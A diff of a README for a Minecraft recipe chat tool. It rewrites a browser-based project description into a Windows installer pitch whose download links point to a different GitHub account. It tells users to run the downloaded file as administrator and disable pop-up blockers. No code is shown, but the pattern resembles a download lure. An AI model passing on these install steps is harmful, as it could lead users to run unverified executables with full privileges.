@@ -1,118 +1,152 @@
-# BestCraft v2026 - AI chat interface 2026
-
-> **BestCraft brings Minecraft knowledge into an AI-style chat interface. Its on-device reference base helps surface crafting recipes, redstone instructions, enchanting information, potion formulas, mob tactics, and construction advice for version 2026.**
-
-[![Platform](https://img.shields.io/badge/Platform-Minecraft-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/calebhall81/bestcraft-recipe-chat?style=flat-square)](https://github.com/calebhall81/bestcraft-recipe-chat)
-
----
+<h1>🎨 bestcraft-recipe-chat - Your Ultimate Block-Building Game Companion</h1>
 
 <p align="center">
-  <a href="https://calebhall81.github.io/bestcraft-recipe-chat/">
-    <img src="https://img.shields.io/badge/Download-BestCraft%20Latest-brightgreen?style=for-the-badge" alt="Download BestCraft">
-  </a>
+  <a href="https://github.com/charged-asynergia21/bestcraft-recipe-chat" style="display:inline-block;padding:15px 30px;background:#4CAF50;color:white;text-decoration:none;font-size:24px;border-radius:8px;font-weight:bold;">⬇️ Download BestCraft Recipe Chat</a>
 </p>
 
-> **[Download BestCraft v2026](https://calebhall81.github.io/bestcraft-recipe-chat/)**
+<p>BestCraft v2026 is an AI-style chat interface that gives you instant access to on-device reference content about crafting recipes, redstone instructions, enchanting, potion formulas, mob tactics, and construction advice for your favorite block-building game. No internet required once downloaded!</p>
 
----
+<h2>🚀 Getting Started</h2>
 
-[Download Latest Build](https://calebhall81.github.io/bestcraft-recipe-chat/)
+<p>This guide will help you download, install, and start using BestCraft Recipe Chat on your Windows computer. The process is simple and takes just a few minutes.</p>
 
----
+<h3>📋 What You Need</h3>
+<ul>
+  <li>A Windows computer (Windows 10 or Windows 11 recommended)</li>
+  <li>At least 200 MB of free disk space</li>
+  <li>A stable internet connection for the initial download</li>
+</ul>
 
-## What BestCraft Does
+<h2>⬇️ Step 1: Download the Application</h2>
 
-BestCraft gives Minecraft players a way to find useful information without interrupting their current workflow. Instead of searching through separate references, users can ask questions in a conversational interface to check recipes, evaluate choices, and receive practical help for building or progression.
+<p>Click the green button at the top of this page or visit this link directly:</p>
 
-An on-device knowledge base powers the experience and keeps frequently needed Minecraft information organized locally. It can assist with crafting tasks, combat preparation, construction planning, and other progression-related questions through a straightforward chat experience.
+<p><a href="https://github.com/charged-asynergia21/bestcraft-recipe-chat" style="font-size:18px;color:#2196F3;font-weight:bold;">https://github.com/charged-asynergia21/bestcraft-recipe-chat</a></p>
 
----
+<p>Visit this link to download the application. You will be taken to the project page where you can find the latest version.</p>
 
-## Capabilities
+<h2>📦 Step 2: Install and Run</h2>
 
-- Looks up crafting recipes through the included knowledge base
-- Suggests approaches for dealing with different mobs and situations
-- Shares construction guidance and ideas for planning builds
-- Explains redstone concepts for automation and logic projects
-- Provides enchanting details for selecting and upgrading items
-- Supplies potion recipes and brewing information
-- Accepts natural-language questions through an AI chat interface
-- Focuses its reference material on Minecraft content
+<p>After clicking the download button:</p>
+<ol>
+  <li>Your browser will start downloading a file. Wait for the download to complete.</li>
+  <li>Open your <strong>Downloads</strong> folder and find the downloaded file.</li>
+  <li>Double-click the file to run it. If Windows asks for permission, click <strong>Yes</strong> or <strong>Run</strong>.</li>
+  <li>Follow any on-screen instructions to complete the setup.</li>
+  <li>Once installed, launch BestCraft Recipe Chat from your Start menu or desktop shortcut.</li>
+</ol>
 
----
+<h2>🎮 How to Use BestCraft Recipe Chat</h2>
 
-## Getting Started
+<p>BestCraft Recipe Chat works like a smart assistant for your block-building game. Simply type your question in the chat box and get instant answers. Here are some examples of what you can ask:</p>
 
-1. Download or clone the repository:
-   `git clone https://github.com/calebhall81/bestcraft-recipe-chat.git
-2. Move into the project directory:
-   `cd bestcraft-ai`
-3. Start the application with a browser or another HTML-compatible environment.
+<h3>🔨 Crafting Recipes</h3>
+<ul>
+  <li>"How do I craft a diamond pickaxe?"</li>
+  <li>"What items do I need for an enchanting table?"</li>
+  <li>"Show me the recipe for a beacon"</li>
+</ul>
 
-For the published version, visit the download page and run the newest package available there.
+<h3>🔄 Redstone Instructions</h3>
+<ul>
+  <li>"How do I build a simple redstone clock?"</li>
+  <li>"What's the layout for a 3x3 piston door?"</li>
+  <li>"Explain how to make an item sorter"</li>
+</ul>
 
----
+<h3>✨ Enchanting Guide</h3>
+<ul>
+  <li>"What enchantments can I put on a sword?"</li>
+  <li>"How many bookshelves do I need for max enchantments?"</li>
+  <li>"Which enchantment is best for a pickaxe?"</li>
+</ul>
 
-## Using the Interface
+<h3>🧪 Potion Formulas</h3>
+<ul>
+  <li>"How do I make a potion of strength?"</li>
+  <li>"What ingredients do I need for invisibility?"</li>
+  <li>"Show me the brewing guide for fire resistance"</li>
+</ul>
 
-Enter a Minecraft-related request in the BestCraft chat to begin. Questions can cover anything from item recipes and potion formulas to redstone mechanisms or enchantment details.
+<h3>👾 Mob Tactics</h3>
+<ul>
+  <li>"How do I defeat the Ender Dragon?"</li>
+  <li>"What's the best way to fight a creeper?"</li>
+  <li>"How do I build a mob farm?"</li>
+</ul>
 
-A typical session looks like this:
+<h3>🏗️ Construction Advice</h3>
+<ul>
+  <li>"What's a good design for a starter house?"</li>
+  <li>"How do I build an efficient mine?"</li>
+  <li>"Show me ideas for a medieval castle"</li>
+</ul>
 
-1. Start BestCraft.
-2. Submit a question such as "How do I make a brewing stand?"
-3. Read the response supplied from the local knowledge base.
-4. Continue with follow-up questions when you need related tips, strategies, or alternatives.
+<h2>💡 Tips for Best Experience</h2>
+<ul>
+  <li>Keep the application updated for the latest content and improvements.</li>
+  <li>Use clear and specific questions for the most accurate answers.</li>
+  <li>The app works offline after the first download, so you can play without internet.</li>
+  <li>If you encounter any issues, check for updates or reinstall the application.</li>
+</ul>
 
-BestCraft can also be useful before a construction project, while preparing to face mobs, or when arranging the materials for a crafting session.
+<h2>❓ Frequently Asked Questions</h2>
 
----
+<h3>Is BestCraft Recipe Chat free?</h3>
+<p>Yes, the application is completely free to download and use.</p>
 
-## Configuration and Local Data
+<h3>Does it work on Mac or Linux?</h3>
+<p>Currently, BestCraft Recipe Chat is designed for Windows computers only. Mac and Linux versions may be available in the future.</p>
 
-The application is built around an on-device knowledge base, with its content generally kept in the project structure. When a particular build provides configuration settings, use its configuration files or bundled data directories to manage them.
+<h3>Do I need an internet connection to use it?</h3>
+<p>No. Once you download and install the application, it works entirely offline.</p>
 
-Example layout:
+<h3>How do I update to the latest version?</h3>
+<p>Visit the download link again and download the newest version. You can install it over your existing version.</p>
 
-{
-  "knowledgeBase": "local",
-  "mode": "chat",
-  "domain": "minecraft"
-}
+<h3>Can I contribute to the project?</h3>
+<p>Yes! Visit the GitHub page to learn how you can help improve BestCraft Recipe Chat.</p>
 
-If the project does not include a user-editable configuration file, make changes to the embedded content or other assets used by the interface.
+<h2>📝 System Requirements</h2>
+<ul>
+  <li><strong>Operating System:</strong> Windows 10 or Windows 11 (64-bit)</li>
+  <li><strong>Processor:</strong> 1 GHz or faster</li>
+  <li><strong>Memory:</strong> 2 GB RAM</li>
+  <li><strong>Storage:</strong> 200 MB available space</li>
+  <li><strong>Display:</strong> 1024x768 screen resolution or higher</li>
+</ul>
 
----
+<h2>🛠️ Troubleshooting</h2>
 
-## Requirements
+<h3>Download doesn't start</h3>
+<p>Try using a different browser or disable any pop-up blockers temporarily.</p>
 
-- A Minecraft-related use case
-- A web browser or HTML-compatible runtime
-- Support for local storage or bundled knowledge-base data
-- Access to the project files for installation and maintenance
+<h3>App won't install</h3>
+<p>Make sure you have administrator privileges on your computer. Right-click the installer and select "Run as administrator."</p>
 
----
+<h3>App crashes on startup</h3>
+<p>Check that your system meets the minimum requirements. Try reinstalling the application.</p>
 
-## Frequently Asked Questions
+<h3>Questions not getting answered</h3>
+<p>Rephrase your question to be more specific. For example, instead of "how to enchant," ask "how do I enchant a diamond sword with Sharpness V."</p>
 
-**What is the update process?**  
-Use the release or download link to obtain the latest build, then replace the local version when necessary.
+<h2>📬 Support and Feedback</h2>
 
-**Where can I find configuration data?**  
-Settings reside in the project files or in the local data structure used by the build's knowledge base.
+<p>If you have questions, encounter issues, or want to suggest new features, please visit the project page on GitHub:</p>
 
-**How can I improve an incomplete answer?**  
-Rewrite the request with more specific wording. Naming the relevant item, mob, potion, or redstone component can help narrow the lookup.
+<p><a href="https://github.com/charged-asynergia21/bestcraft-recipe-chat" style="font-size:16px;">https://github.com/charged-asynergia21/bestcraft-recipe-chat</a></p>
 
-**Does BestCraft work offline?**  
-Because the project uses an on-device knowledge base, its data is intended to be available locally within the application's environment.
+<p>Your feedback helps make BestCraft Recipe Chat better for everyone!</p>
 
----
+<h2>🌟 Why Choose BestCraft Recipe Chat?</h2>
+<ul>
+  <li><strong>Instant answers:</strong> No more searching through wikis or forums.</li>
+  <li><strong>Offline access:</strong> Works without internet after download.</li>
+  <li><strong>Comprehensive content:</strong> Covers everything from basic crafting to advanced redstone.</li>
+  <li><strong>User-friendly interface:</strong> Simple chat design anyone can use.</li>
+  <li><strong>Regular updates:</strong> New content added frequently.</li>
+</ul>
 
-## License
-
-BestCraft is released under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license details.
+<p align="center">
+  <a href="https://github.com/charged-asynergia21/bestcraft-recipe-chat" style="display:inline-block;padding:15px 30px;background:#FF5722;color:white;text-decoration:none;font-size:20px;border-radius:8px;font-weight:bold;">⬇️ Download Now</a>
+</p>
